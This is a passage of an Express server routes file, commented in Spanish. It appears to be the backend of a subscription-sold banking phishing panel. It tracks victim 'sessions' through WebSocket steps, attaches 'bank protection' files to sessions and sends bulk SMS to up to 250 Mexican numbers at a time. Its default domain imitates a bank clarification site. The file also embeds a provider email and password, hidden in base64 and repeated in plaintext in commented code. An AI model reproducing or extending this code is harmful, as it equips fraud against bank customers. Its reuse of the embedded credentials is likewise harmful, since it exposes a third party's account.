Verificar si el paso actual requiere entrada del usuario\n                const requiresInput = currentStep.waitForUserInput !== false; // Por defecto true\n                \n                // Si el paso requiere entrada y acabamos de recibirla, o si no requiere entrada, avanzar\n                const shouldAdvance = (requiresInput && tipo !== 'validando' && tipo !== 'geolocation') || !requiresInput;\n                \n                if (shouldAdvance) {\n                  await advanceToNextStep(currentStepIndex);\n                }\n              }\n            }\n            // === FIN DE LGICA DE FLUJO AUTOMTICO ===\n\n          } catch (error) {\n            console.error(\"Invalid client input data:\", error);\n            ws.send(JSON.stringify({ \n              type: 'ERROR', \n              message: \"Invalid client input data\" \n            }));\n          }\n          return;\n        }\n      } catch (error) {\n        console.error(\"Error processing WebSocket message:\", error);\n      }\n    });\n\n    // Handle disconnection\n    ws.on('close', () => {\n      // Buscar y eliminar el cliente del adminClients Map\n      let adminUserRemoved = false;\n      \n      // Iteramos sobre el Map usando entradas como array\n      const adminEntries = Array.from(adminClients.entries());\n      for (let i = 0; i < adminEntries.length; i++) {\n        const [username, client] = adminEntries[i];\n        if (client === ws) {\n          adminClients.delete(username);\n          console.log(`Admin client disconnected: ${username}`);\n          adminUserRemoved = true;\n          break; // Terminamos el bucle una vez encontrado\n        }\n      }\n      \n      // Si no era un cliente admin, revisamos si era un cliente regular\n      if (!adminUserRemoved) {\n        // Buscar y eliminar de clients si era un cliente\n        const clientEntries = Array.from(clients.entries());\n        for (let i = 0; i < clientEntries.length; i++) {\n          const [sessionId, client] = clientEntries[i];\n          if (client === ws) {\n            clients.delete(sessionId);\n            console.log(`Client with session ID ${sessionId} disconnected`);\n            break; // Terminamos el bucle una vez encontrado\n          }\n        }\n      }\n    });\n  });\n\n  // === API de SMS ===\n\n  // Obtener la configuraci贸n actual de la API de SMS\n  app.get('/api/sms/config', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const config = await storage.getSmsConfig();\n      // Si hay una config, ocultamos las credenciales por seguridad, solo mostramos si est谩n activas\n      if (config) {\n        res.json({\n          isActive: config.isActive,\n          updatedAt: config.updatedAt,\n          updatedBy: config.updatedBy,\n          hasCredentials: !!(config.username && config.password), // Verificar si hay credenciales configuradas\n          apiUrl: config.apiUrl || 'https://api.sofmex.mx/api/sms'\n        });\n      } else {\n        res.json({\n          isActive: false,\n          hasCredentials: false,\n          apiUrl: Buffer.from('aHR0cHM6Ly9hcGkuc29mbWV4Lm14L2FwaS9zbXM=', 'base64').toString(),\n          updatedAt: null,\n          updatedBy: null\n        });\n      }\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Actualizar la configuraci贸n de la API de SMS\n  app.post('/api/sms/config', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const user = req.user;\n      // Solo usuario administrador puede actualizar la configuraci贸n\n      if (user.role !== UserRole.ADMIN) {\n        return res.status(403).json({ message: \"Solo administradores pueden actualizar la configuraci贸n de API\" });\n      }\n\n      // Verificamos si es un modo de simulaci贸n\n      const apiUrl = req.body.apiUrl || 'https://api.sofmex.mx/api/sms';\n      const simulationMode = apiUrl && (apiUrl.includes('simulacion') || apiUrl.includes('localhost'));\n\n      // Usar las credenciales proporcionadas o las predeterminadas ofuscadas\n      const defaultUser = Buffer.from('am9zZW1vcmVub2ZzMTlAZ21haWwuY29t', 'base64').toString();\n      const defaultPass = Buffer.from('QmFsb24xOUA=', 'base64').toString();\n      const username = req.body.username || defaultUser;\n      const password = req.body.password || defaultPass;\n      \n      // La API est谩 activa si est谩 en modo simulaci贸n o si tiene credenciales v谩lidas\n      const hasValidCredentials = simulationMode || (!!username && !!password);\n      const isActive = hasValidCredentials;\n      \n      // Si no estamos en modo simulaci贸n y faltan credenciales, advertimos pero seguimos\n      let credentialsWarning = '';\n      if (!simulationMode && (!username || !password)) {\n        credentialsWarning = \"Advertencia: No has proporcionado credenciales v谩lidas para el modo real.\";\n      }\n\n      const data = insertSmsConfigSchema.parse({\n        username: username,\n        password: password,\n        apiUrl: apiUrl,\n        isActive: isActive,\n        updatedBy: user.username\n      });\n\n      const config = await storage.updateSmsConfig(data);\n\n      // Respuesta adicional para el modo simulaci贸n\n      const response: {\n        isActive: boolean | null;\n        updatedAt: Date | null;\n        updatedBy: string;\n        hasCredentials: boolean;\n        apiUrl: string | null;\n        success: boolean;\n        message?: string;\n      } = {\n        isActive: config.isActive,\n        updatedAt: config.updatedAt,\n        updatedBy: config.updatedBy,\n        hasCredentials: hasValidCredentials,\n        apiUrl: config.apiUrl,\n        success: true\n      };\n\n      if (simulationMode) {\n        console.log(\"API de SMS configurada en modo simulaci贸n:\", config.apiUrl);\n        response.message = \"API configurada en modo simulaci贸n. Los mensajes ser谩n enviados solo de manera simulada.\";\n      }\n\n      res.json(response);\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Obtener los cr茅ditos SMS del usuario actual\n  app.get('/api/sms/credits', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const user = req.user;\n      const credits = await storage.getUserSmsCredits(user.id);\n      res.json({ credits });\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Obtener el historial de SMS del usuario actual\n  app.get('/api/sms/history', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const user = req.user;\n      const history = await storage.getUserSmsHistory(user.id);\n      res.json(history);\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Obtener informaci贸n sobre las rutas SMS disponibles\n  app.get('/api/sms/routes', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const routes = [\n        {\n          type: SmsRouteType.LONG_CODE,\n          name: \"Long Code (Ankarex)\",\n          description: \"Ruta econ贸mica con buena entregabilidad\",\n          creditCost: 0.5,\n          provider: \"Ankarex\",\n          reliability: \"Media-Alta\",\n          speed: \"Normal\"\n        },\n        {\n          type: SmsRouteType.SHORT_CODE,\n          name: \"Short Code (eims)\",\n          description: \"Ruta premium con alta velocidad de entrega\",\n          creditCost: 1,\n          provider: \"eims\",\n          reliability: \"Muy Alta\",\n          speed: \"Muy R谩pida\"\n        },\n        {\n          type: SmsRouteType.PREMIUM,\n          name: \"Premium (eims)\",\n          description: \"Ruta premium de alta calidad y velocidad\",\n          creditCost: 1,\n          provider: \"eims\",\n          reliability: \"Muy Alta\",\n          speed: \"Muy R谩pida\"\n        }\n      ];\n\n      res.json({ success: true, routes });\n    } catch (error: any) {\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n\n\n  // Enviar un SMS (RUTA ANTIGUA - COMENTADA)\n  /*\n  app.post('/api/sms/send', async (req, res) => {\n    try {\n      console.log(\"Recibida solicitud de env铆o de SMS\");\n      \n      if (!req.isAuthenticated()) {\n        console.log(\"Error: Usuario no autenticado\");\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const user = req.user;\n      console.log(`Usuario: ${user.username}, Role: ${user.role}`);\n      \n      const config = await storage.getSmsConfig();\n      console.log(\"Configuraci贸n SMS:\", config);\n\n      // Verificar si la API est谩 configurada\n      if (!config || !config.isActive) {\n        console.log(\"Error: API no configurada o inactiva\");\n        return res.status(400).json({ \n          success: false, \n          message: \"La API de SMS no est谩 configurada o est谩 inactiva\" \n        });\n      }\n\n      // Verificar si est谩 en modo simulaci贸n (con la URL simple 'simulacion')\n      const simulationMode = config.apiUrl === 'simulacion' || \n                          (config.apiUrl && (config.apiUrl.includes('simulacion') || config.apiUrl.includes('localhost')));\n      \n      console.log(\"Modo simulaci贸n detectado:\", simulationMode);\n\n      // En modo simulaci贸n no necesitamos credenciales v谩lidas, pero en modo real s铆\n      const hasValidCredentials = simulationMode || (!!config.username && !!config.password);\n      \n      // Si no estamos en modo simulaci贸n y no tenemos credenciales v谩lidas, no podemos enviar\n      if (!hasValidCredentials) {\n        return res.status(400).json({ \n          success: false, \n          message: \"La API de SMS no tiene credenciales configuradas. Ve a Configuraci贸n y proporciona un usuario y contrase帽a v谩lidos.\" \n        });\n      }\n\n      // Verificar si el usuario tiene cr茅ditos (solo para usuarios regulares)\n      // Los administradores no necesitan cr茅ditos para enviar SMS\n      if (user.role !== UserRole.ADMIN) {\n        const hasCredits = await storage.useSmsCredit(user.id);\n        if (!hasCredits) {\n          return res.status(400).json({ \n            success: false, \n            message: \"No tienes cr茅ditos suficientes para enviar un SMS\" \n          });\n        }\n      }\n\n      // Validar los datos del SMS\n      const { phoneNumber, message, sessionId } = req.body;\n      \n      console.log(\"Datos de SMS a enviar:\", { phoneNumber, messageLength: message?.length || 0, sessionId });\n\n      if (!phoneNumber) {\n        return res.status(400).json({ \n          success: false, \n          message: \"Se requiere n煤mero de tel茅fono\" \n        });\n      }\n      \n      // Permitir mensaje vac铆o para mayor flexibilidad\n      const messageContent = message || \"Mensaje de prueba\";\n\n      // Preparar los datos para el historial\n      const smsData = insertSmsHistorySchema.parse({\n        userId: user.id,\n        phoneNumber,\n        message: messageContent,\n        sessionId: sessionId || null\n      });\n\n      // Guardar en el historial como pendiente\n      const smsRecord = await storage.addSmsToHistory(smsData);\n\n      // Verificar si estamos en modo simulaci贸n antes de continuar\n      if (simulationMode) {\n        console.log(\"Detectado modo simulaci贸n - Procesando SMS simulado\");\n        // Actualizar el registro como enviado (simulado)\n        await storage.updateSmsStatus(smsRecord.id, 'sent');\n        \n        return res.json({\n          success: true,\n          message: \"Mensaje enviado correctamente (simulado)\",\n          smsId: smsRecord.id,\n          simulated: true\n        });\n      }\n      \n      // Implementaci贸n real de la API de Sofmex (s贸lo se ejecuta si no estamos en modo simulaci贸n)\n      try {\n        // Primero verificamos que tengamos una configuraci贸n\n        if (!config) {\n          throw new Error(\"Configuraci贸n de API no encontrada\");\n        }\n        \n        const username = config.username || 'josemorenofs19@gmail.com';\n        const password = config.password || 'Balon19@';\n        \n        // Ajustar URL base seg煤n la documentaci贸n oficial de SofMex\n        const apiUrl = config.apiUrl || 'https://api.sofmex.mx';\n        \n        // URL espec铆fica para env铆o de SMS seg煤n la documentaci贸n de SofMex\n        // Consultar correctamente la documentaci贸n en https://api.sofmex.mx/api/swagger-ui/index.html\n        \n        // Telegram funciona con esta URL, as铆 que usemos el mismo formato\n        let smsApiUrl = 'https://api.sofmex.mx/smssend';\n        console.log(\"Usando URL para API de SofMex:\", smsApiUrl);\n        \n        // Ya no usamos autenticaci贸n b谩sica en los headers porque pasamos los datos\n        // directamente en el cuerpo de la solicitud\n        \n        // Formato del cuerpo seg煤n el formato que espera la API\n        const requestData = {\n          method: 'POST',\n          headers: {\n            'Content-Type': 'application/json'\n          },\n          body: JSON.stringify({\n            numero: phoneNumber,             // El n煤mero de tel茅fono \n            mensaje: messageContent,         // El mensaje a enviar\n            usuario: username,               // Usuario para autenticaci贸n\n            password: password               // Contrase帽a para autenticaci贸n\n          })\n        };\n\n        console.log(\"Enviando SMS a trav茅s de la API:\", {\n          url: smsApiUrl,\n          phone: phoneNumber,\n          messageLength: messageContent.length\n        });\n\n        try {\n          console.log(\"Intentando conectar a:\", smsApiUrl);\n          // Ocultar la contrase帽a en los logs para seguridad\n          const logData = JSON.parse(requestData.body as string);\n          const redactedData = {\n              ...logData,\n              password: \"[CONTRASEA_OCULTA]\"\n          };\n          \n          console.log(\"Datos de la solicitud:\", {\n            method: requestData.method,\n            headers: requestData.headers,\n            datos: redactedData\n          });\n\n          // Ya verificamos el modo simulaci贸n arriba, as铆 que este bloque es innecesario\n          // Lo eliminamos para evitar confusiones\n\n          // Agregar timeout para evitar bloqueo indefinido\n          const controller = new AbortController();\n          const timeoutId = setTimeout(() => controller.abort(), 10000);\n\n          try {\n            // Usaremos axios en lugar de fetch ya que puede manejar mejor ciertas situaciones de red\n            console.log(\"Usando axios para realizar la solicitud\");\n            const axiosResponse = await axios.post(smsApiUrl, {\n              numero: phoneNumber,\n              mensaje: messageContent,\n              usuario: username,\n              password: password\n            }, {\n              headers: {\n                'Content-Type': 'application/json'\n              },\n              timeout: 10000 // 10 segundos de timeout\n            });\n            \n            // Simulamos una respuesta fetch para mantener compatibilidad con el c贸digo existente\n            const response = {\n              ok: axiosResponse.status >= 200 && axiosResponse.status < 300,\n              status: axiosResponse.status,\n              statusText: axiosResponse.statusText,\n              text: async () => JSON.stringify(axiosResponse.data)\n            };\n\n            clearTimeout(timeoutId);\n\n            const responseText = await response.text();\n            let responseData;\n\n            try {\n              responseData = JSON.parse(responseText);\n            } catch (e) {\n              responseData = { message: `Respuesta no es JSON v谩lido: ${responseText.substring(0, 100)}` };\n            }\n\n            console.log(\"Respuesta recibida:\", {\n              status: response.status,\n              statusText: response.statusText,\n              data: responseData\n            });\n\n            if (response.ok) {\n              // Actualizar el registro como enviado\n              await storage.updateSmsStatus(smsRecord.id, 'sent');\n              console.log(\"SMS enviado correctamente:\", responseData);\n\n              res.json({\n                success: true,\n                message: \"Mensaje enviado correctamente\",\n                smsId: smsRecord.id,\n                apiResponse: responseData\n              });\n            } else {\n              // La API respondi贸 con un error\n              const errorMsg = responseData.message || `Error ${response.status}: ${response.statusText}`;\n              await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);\n              console.error(\"Error al enviar SMS:\", errorMsg);\n\n              res.status(400).json({\n                success: false,\n                message: `Error en la API de SMS: ${errorMsg}`,\n                smsId: smsRecord.id\n              });\n            }\n          } catch (fetchError: any) {\n            if (fetchError.name === 'AbortError') {\n              const timeoutMsg = 'La solicitud excedi贸 el tiempo de espera (10 segundos)';\n              await storage.updateSmsStatus(smsRecord.id, 'failed', timeoutMsg);\n              console.error(\"Timeout en la solicitud a la API de SMS\");\n\n              res.status(500).json({\n                success: false,\n                message: timeoutMsg,\n                smsId: smsRecord.id\n              });\n            } else {\n              throw fetchError; // Propagar otros errores al manejador externo\n            }\n          }\n\n        } catch (error: any) {\n          // Error al realizar la solicitud fetch\n          const errorMsg = error.message || 'Error de conexi贸n con la API';\n          await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);\n          console.error(\"Error de conexi贸n con la API de SMS:\", errorMsg);\n\n          res.status(500).json({\n            success: false,\n            message: `Error de conexi贸n con la API de SMS: ${errorMsg}`,\n            smsId: smsRecord.id\n          });\n        }\n      } catch (apiError: any) {\n        // Si ocurre un error con la API, actualizar el estado del SMS\n        await storage.updateSmsStatus(smsRecord.id, 'failed', apiError.message);\n        throw apiError;\n      }\n    } catch (error: any) {\n      res.status(500).json({ \n        success: false, \n        message: error.message \n      });\n    }\n  });\n  */\n\n  // Obtener historial de SMS enviados\n  app.get('/api/sms/history', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const user = req.user;\n      const history = await storage.getUserSmsHistory(user.id);\n\n      res.json(history);\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Obtener todos los usuarios regulares (para agregar cr茅ditos)\n  app.get('/api/users/regular', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const currentUser = req.user;\n      // Solo administradores pueden ver la lista de usuarios\n      if (currentUser.role !== UserRole.ADMIN) {\n        return res.status(403).json({ message: \"Solo administradores pueden ver la lista de usuarios\" });\n      }\n\n      const users = await storage.getAllUsers();\n      // Filtrar administradores y enviar solo datos b谩sicos\n      const regularUsers = users.filter(user => user.role === UserRole.USER).map(user => ({\n        id: user.id,\n        username: user.username,\n        isActive: user.isActive,\n        expiresAt: user.expiresAt,\n        credits: 0 // El frontend tendr谩 que cargar los cr茅ditos aparte\n      }));\n\n      res.json(regularUsers);\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Ruta para obtener informaci贸n de la suscripci贸n del usuario\n  app.get(\"/api/user/subscription\", async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ error: \"No autenticado\" });\n      }\n      \n      const user = req.user;\n      const now = new Date();\n      const expiresAt = user.expiresAt;\n      \n      // Determinar si es administrador\n      const isAdmin = user.role === UserRole.ADMIN;\n      \n      // Si es administrador, devolver un conjunto diferente de datos\n      if (isAdmin) {\n        return res.json({\n          isActive: true,\n          isPaid: true,\n          isAdmin: true,\n          expiresAt: null,\n          daysRemaining: null,\n          hoursRemaining: null,\n          message: \"Cuenta de administrador con acceso completo\"\n        });\n      }\n      \n      // Calcular d铆as y horas restantes si hay una fecha de expiraci贸n\n      let daysRemaining = null;\n      let hoursRemaining = null;\n      \n      if (expiresAt) {\n        const diffMs = expiresAt.getTime() - now.getTime();\n        const diffHrs = Math.floor(diffMs / (1000 * 60 * 60));\n        daysRemaining = Math.floor(diffHrs / 24);\n        hoursRemaining = diffHrs % 24;\n      }\n      \n      // Determinar si est谩 activo (es decir, si la suscripci贸n no ha expirado)\n      const isActive = !!user.isActive;\n      \n      // Determinar si est谩 pagado (puede estar inactivo pero con pago pendiente)\n      const isPaid = isActive && !!expiresAt && expiresAt > now;\n      \n      // Crear el mensaje apropiado seg煤n el estado\n      let message = \"\";\n      \n      if (!isActive) {\n        message = \"Tu cuenta est谩 desactivada. Contacta al administrador para activarla.\";\n      } else if (!expiresAt) {\n        message = \"No tienes una suscripci贸n activa. Contacta al administrador para adquirir una.\";\n      } else if (expiresAt < now) {\n        message = \"Tu suscripci贸n ha vencido. Contacta al administrador para renovarla.\";\n      } else if (daysRemaining === 0 && hoursRemaining !== null && hoursRemaining <= 24) {\n        message = `Tu suscripci贸n vence pronto. Contacta al administrador en Telegram (@BalonxSistema) para renovar.`;\n      } else if (daysRemaining !== null && daysRemaining <= 1) {\n        message = `Tu suscripci贸n vence en menos de 2 d铆as. Contacta al administrador para renovar.`;\n      } else {\n        message = \"Suscripci贸n vigente. Puedes usar todos los servicios.\";\n      }\n      \n      res.json({\n        isActive,\n        isPaid,\n        isAdmin,\n        expiresAt: expiresAt ? expiresAt.toISOString() : null,\n        daysRemaining,\n        hoursRemaining,\n        message\n      });\n    } catch (error: any) {\n      console.error(\"Error al obtener informaci贸n de suscripci贸n:\", error);\n      res.status(500).json({ error: error.message || \"Error al obtener informaci贸n de suscripci贸n\" });\n    }\n  });\n\n  // Ruta para subir archivos de protecci贸n bancaria\n  app.post('/api/upload-protection-file', upload.single('file'), async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    if (!req.file) {\n      return res.status(400).json({ message: \"No se subi贸 ning煤n archivo\" });\n    }\n\n    try {\n      const { sessionId } = req.body;\n      if (!sessionId) {\n        return res.status(400).json({ message: \"Session ID requerido\" });\n      }\n\n      // Generar URL del archivo\n      const fileUrl = `/uploads/${req.file.filename}`;\n      const fileSize = `${(req.file.size / 1024 / 1024).toFixed(2)} MB`;\n\n      // Actualizar la sesi贸n con la informaci贸n del archivo\n      await storage.updateSession(sessionId, {\n        fileName: req.file.originalname,\n        fileUrl: fileUrl,\n        fileSize: fileSize\n      });\n\n      console.log(`Archivo subido para sesi贸n ${sessionId}: ${req.file.originalname}`);\n\n      res.json({\n        success: true,\n        fileName: req.file.originalname,\n        fileUrl: fileUrl,\n        fileSize: fileSize\n      });\n    } catch (error) {\n      console.error(\"Error subiendo archivo:\", error);\n      res.status(500).json({ message: \"Error interno del servidor\" });\n    }\n  });\n\n  // Ruta para eliminar archivo de protecci贸n bancaria\n  app.delete('/api/remove-protection-file/:sessionId', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { sessionId } = req.params;\n      \n      // Obtener informaci贸n del archivo actual\n      const session = await storage.getSessionById(sessionId);\n      if (session && session.fileUrl) {\n        // Eliminar archivo del sistema de archivos\n        const filePath = path.join(process.cwd(), session.fileUrl);\n        if (fs.existsSync(filePath)) {\n          fs.unlinkSync(filePath);\n        }\n      }\n\n      // Limpiar informaci贸n del archivo en la sesi贸n\n      await storage.updateSession(sessionId, {\n        fileName: null,\n        fileUrl: null,\n        fileSize: null\n      });\n\n      res.json({ success: true });\n    } catch (error) {\n      console.error(\"Error eliminando archivo:\", error);\n      res.status(500).json({ message: \"Error interno del servidor\" });\n    }\n  });\n\n  // === API de configuraci贸n del sitio ===\n  \n  // Obtener la configuraci贸n actual del sitio\n  app.get('/api/site-config', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const user = req.user;\n      // Solo usuarios administradores pueden acceder a la configuraci贸n del sitio\n      if (user.role !== UserRole.ADMIN) {\n        return res.status(403).json({ message: \"Solo administradores pueden acceder a la configuraci贸n del sitio\" });\n      }\n\n      const config = await storage.getSiteConfig();\n      if (config) {\n        res.json({\n          baseUrl: config.baseUrl,\n          updatedAt: config.updatedAt,\n          updatedBy: config.updatedBy\n        });\n      } else {\n        // Si no hay configuraci贸n, devolver los valores por defecto\n        res.json({\n          baseUrl: \"https://aclaracionesditales.com\",\n          updatedAt: null,\n          updatedBy: null\n        });\n      }\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Actualizar la configuraci贸n del sitio\n  app.post('/api/site-config', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const user = req.user;\n      // Solo usuarios administradores pueden actualizar la configuraci贸n del sitio\n      if (user.role !== UserRole.ADMIN) {\n        return res.status(403).json({ message: \"Solo administradores pueden actualizar la configuraci贸n del sitio\" });\n      }\n\n      // Validar y normalizar la URL usando el esquema robusto  \n      const data = insertSiteConfigSchema.parse({\n        baseUrl: req.body.baseUrl,\n        updatedBy: user.username\n      });\n\n      const config = await storage.updateSiteConfig(data);\n\n      res.json({\n        success: true,\n        baseUrl: config.baseUrl,\n        updatedAt: config.updatedAt,\n        updatedBy: config.updatedBy,\n        message: \"Configuraci贸n del sitio actualizada correctamente\"\n      });\n    } catch (error: any) {\n      // Manejar errores de validaci贸n de Zod espec铆ficamente\n      if (error.name === 'ZodError') {\n        const validationError = error.errors[0];\n        return res.status(400).json({ \n          message: `Error de validaci贸n: ${validationError.message}`,\n          field: validationError.path[0]\n        });\n      }\n      \n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // === RUTAS DE SMS ===\n  \n  // Obtener configuraci贸n de SMS\n  app.get('/api/sms/config', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const config = await storage.getSmsConfig();\n      res.json({ success: true, config });\n    } catch (error: any) {\n      console.error('Error obteniendo configuraci贸n SMS:', error);\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  // Actualizar configuraci贸n de SMS\n  app.post('/api/sms/config', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { username, password, apiUrl } = req.body;\n      \n      const configData: InsertSmsConfig = {\n        username: username || null,\n        password: password || null,\n        apiUrl: apiUrl || \"https://www.sofmex.com/api/sms/v3/asignacion\",\n        isActive: true,\n        updatedBy: user.username\n      };\n\n      const config = await storage.updateSmsConfig(configData);\n      res.json({ success: true, config });\n    } catch (error: any) {\n      console.error('Error actualizando configuraci贸n SMS:', error);\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  // Obtener cr茅ditos de un usuario\n  app.get('/api/sms/credits/:userId', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const userId = parseInt(req.params.userId);\n      const credits = await storage.getUserSmsCredits(userId);\n      res.json({ success: true, credits });\n    } catch (error: any) {\n      console.error('Error obteniendo cr茅ditos SMS:', error);\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  // Agregar cr茅ditos a un usuario\n  app.post('/api/sms/credits/add', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { userId, amount } = req.body;\n      \n      console.log('Datos recibidos para agregar cr茅ditos:', { userId, amount, userIdType: typeof userId, amountType: typeof amount });\n      \n      if (!userId || !amount || amount <= 0) {\n        return res.status(400).json({ \n          success: false, \n          message: \"ID de usuario y cantidad v谩lida son requeridos\" \n        });\n      }\n\n      const parsedUserId = parseInt(userId);\n      const parsedAmount = parseInt(amount);\n      \n      console.log('Datos parseados:', { parsedUserId, parsedAmount });\n      \n      if (isNaN(parsedUserId) || isNaN(parsedAmount)) {\n        return res.status(400).json({ \n          success: false, \n          message: \"ID de usuario y cantidad deben ser n煤meros v谩lidos\" \n        });\n      }\n\n      const credits = await storage.addSmsCredits(parsedUserId, parsedAmount);\n\n      res.json({ success: true, credits });\n    } catch (error: any) {\n      console.error('Error agregando cr茅ditos SMS:', error);\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  // Obtener historial de SMS de un usuario\n  app.get('/api/sms/history/:userId', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const userId = parseInt(req.params.userId);\n      const history = await storage.getUserSmsHistory(userId);\n      res.json({ success: true, history });\n    } catch (error: any) {\n      console.error('Error obteniendo historial SMS:', error);\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  // Enviar SMS con selecci贸n de ruta (Short Code 1 cr茅dito, Long Code 0.5 cr茅ditos)\n  app.post('/api/sms/send', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    // Permitir tanto administradores como usuarios normales\n    if (user.role !== UserRole.ADMIN && user.role !== UserRole.USER) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { phoneNumbers, message, prefix = '+52', routeType = 'long_code' } = req.body;\n      \n      console.log('Datos recibidos para SMS:', { \n        phoneNumbers, \n        messageLength: message?.length, \n        prefix,\n        routeType\n      });\n\n      // Validar que se proporcione n煤mero de tel茅fono\n      if (!phoneNumbers || phoneNumbers.trim() === '') {\n        return res.status(400).json({ \n          success: false, \n          message: \"Se requiere n煤mero de tel茅fono\" \n        });\n      }\n\n      // Validar el mensaje\n      const messageValidation = validateSMSMessage(message);\n      if (!messageValidation.valid) {\n        return res.status(400).json({ \n          success: false, \n          message: messageValidation.error \n        });\n      }\n\n      // Validar tipo de ruta\n      const selectedRoute = routeType as SmsRouteType;\n      if (!Object.values(SmsRouteType).includes(selectedRoute)) {\n        return res.status(400).json({ \n          success: false, \n          message: \"Tipo de ruta inv谩lido\" \n        });\n      }\n\n      // Procesar y validar n煤meros de tel茅fono\n      const processedNumbers = parsePhoneNumbers(phoneNumbers, prefix);\n      \n      if (processedNumbers.length === 0) {\n        return res.status(400).json({ \n          success: false, \n          message: \"No se encontraron n煤meros de tel茅fono v谩lidos\" \n        });\n      }\n\n      if (processedNumbers.length > 250) {\n        return res.status(400).json({ \n          success: false, \n          message: \"M谩ximo 250 n煤meros por env铆o\" \n        });\n      }\n\n      // Calcular cr茅ditos requeridos seg煤n la ruta\n      const requiredCredits = calculateCreditCost(processedNumbers.length, selectedRoute);\n      \n      // Verificar cr茅ditos solo para usuarios regulares (no administradores)\n      const userCredits = await storage.getUserSmsCredits(user.id);\n\n      if (user.role !== UserRole.ADMIN && userCredits < requiredCredits) {\n        return res.status(400).json({ \n          success: false, \n          message: `Cr茅ditos insuficientes. Tienes ${userCredits}, necesitas ${requiredCredits} (${selectedRoute === SmsRouteType.LONG_CODE ? '0.5' : selectedRoute === SmsRouteType.SHORT_CODE || selectedRoute === SmsRouteType.PREMIUM ? '1' : '1'} cr茅dito por SMS)` \n        });\n      }\n\n      console.log(` Enviando ${processedNumbers.length} SMS v铆a ${selectedRoute} por usuario ${user.username} (${requiredCredits} cr茅ditos)`);\n\n      // Enviar SMS usando la ruta seleccionada\n      const smsResult = await sendSMSWithRoute(processedNumbers, message, selectedRoute);\n      \n      let successCount = 0;\n      let failedCount = 0;\n      let creditsUsed = 0;\n\n      if (smsResult.success) {\n        successCount = processedNumbers.length;\n        // Descontar cr茅ditos solo si el env铆o fue exitoso y el usuario no es admin\n        if (user.role !== UserRole.ADMIN) {\n          const creditDeducted = await storage.useSmsCredits(user.id, requiredCredits);\n          if (creditDeducted) {\n            creditsUsed = requiredCredits;\n            console.log(` SMS enviados exitosamente v铆a ${selectedRoute}. Cr茅ditos descontados: ${requiredCredits}`);\n          } else {\n            console.log(`锔 SMS enviados pero no se pudieron descontar cr茅ditos`);\n          }\n        } else {\n          